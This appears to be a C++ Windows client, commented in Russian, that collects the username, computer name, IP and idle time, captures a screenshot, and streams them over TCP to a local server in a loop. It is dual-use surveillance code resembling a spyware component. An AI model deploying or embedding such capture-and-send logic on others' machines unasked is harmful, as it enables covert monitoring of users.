#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <Lmcons.h>
#include <gdiplus.h>
#include <ws2tcpip.h>

#pragma comment (lib,"Gdiplus.lib")
#pragma comment(lib, "Ws2_32.lib")



void SaveScreenshotToFile(const WCHAR* filename) {
    // Инициализация GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Получаем контекст устройства для экрана
    HDC hdcScreen = GetDC(NULL);
    // Создаем совместимый контекст устройства в памяти
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    // Определяем размер экрана
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Создаем совместимый Bitmap для хранения скриншота
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);

    // Выбираем Bitmap в контексте памяти
    SelectObject(hdcMem, hbmScreen);

    // Выполняем копирование пикселей из экрана в контекст памяти
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    // Создаем объект Bitmap из HBITMAP для работы с GDI+
    Gdiplus::Bitmap bitmap(hbmScreen, NULL);

    // Сохраняем Bitmap в файл
    CLSID clsid;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsid); // CLSID для PNG
    bitmap.Save(filename, &clsid, NULL);

    // Очищаем ресурсы
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    // Завершаем работу GDI+
    Gdiplus::GdiplusShutdown(gdiplusToken);
}

class SystemInfo {
public:
    std::string getUsername() {
        char username[UNLEN + 1];
        DWORD len = UNLEN + 1;
        GetUserNameA(username, &len);
        return std::string(username);
    }

    std::string getComputerName() {
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
        GetComputerNameA(computerName, &len);
        return std::string(computerName);
    }

    std::string getIpAddress() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));

        addrinfo hints = {};
        hints.ai_family = AF_INET; // For IPv4 addresses
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        addrinfo* result = nullptr;
        if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) {
            return "Unknown";
        }

        char ipStr[INET_ADDRSTRLEN];
        sockaddr_in* sockaddr_ipv4 = (sockaddr_in*)result->ai_addr;
        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);

        freeaddrinfo(result);
        return std::string(ipStr);
    }

    DWORD getLastInputTime() {
        LASTINPUTINFO lii;
        lii.cbSize = sizeof(LASTINPUTINFO);

        if (!GetLastInputInfo(&lii)) {
            return 0;
        }

        return lii.dwTime;
    }

    DWORD getIdleTime() {
        DWORD tickCount = GetTickCount();
        DWORD lastInputTime = getLastInputTime();

        if (lastInputTime == 0) {
            return 0;
        }

        return (tickCount - lastInputTime) / 1000;  // Время простоя в секундах
    }
    
};

class Client {
public:
    Client(const std::string& serverIp, int serverPort)
        : serverIp(serverIp), serverPort(serverPort) {
        // Инициализация Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed." << std::endl;
            exit(EXIT_FAILURE);
        }

        // Создание сокета
        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Socket creation failed." << std::endl;
            WSACleanup();
            exit(EXIT_FAILURE);
        }

        // Настройка адреса сервера
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(serverPort);
        inet_pton(AF_INET, serverIp.c_str(), &serverAddr.sin_addr);

        // Подключение к серверу
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "Connection to server failed." << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            exit(EXIT_FAILURE);
        }
    }


    void sendSystemInfo() {
        SystemInfo sysInfo;
        std::string message = "Username: " + sysInfo.getUsername() +
            "\nComputerName: " + sysInfo.getComputerName() +
            "\nIP: " + sysInfo.getIpAddress() +
            "\nIdle Time: " + std::to_string(sysInfo.getIdleTime()) + " seconds\n";

        send(clientSocket, message.c_str(), message.size(), 0);
    }


    void captureAndSendScreenshot() {
        // Сначала сохранить скриншот
        SaveScreenshotToFile(L"C:\\Users\\Komp\\Desktop\\screenshot.png");

        // Затем отправить файл на сервер (пример для небольшого файла)
        FILE* file = nullptr;
        errno_t err = fopen_s(&file, "C:\\Users\\Komp\\Desktop\\screenshot.png", "rb");
        if (err == 0 && file) {
            char buffer[1024];
            while (size_t bytesRead = fread(buffer, 1, sizeof(buffer), file)) {
                send(clientSocket, buffer, bytesRead, 0);
            }
            fclose(file);
        }
        else {
            std::cerr << "Failed to open screenshot file." << std::endl;
        }

    }


private:
    std::string serverIp;
    int serverPort;
    SOCKET clientSocket;
};


int main() {
    Client client("127.0.0.1", 8080);
    client.sendSystemInfo();
    client.captureAndSendScreenshot();

    // Цикл, который будет периодически отправлять данные на сервер
    while (true) {
        client.sendSystemInfo();
        Sleep(5000); // Пауза между отправками
    }

    return 0;
}
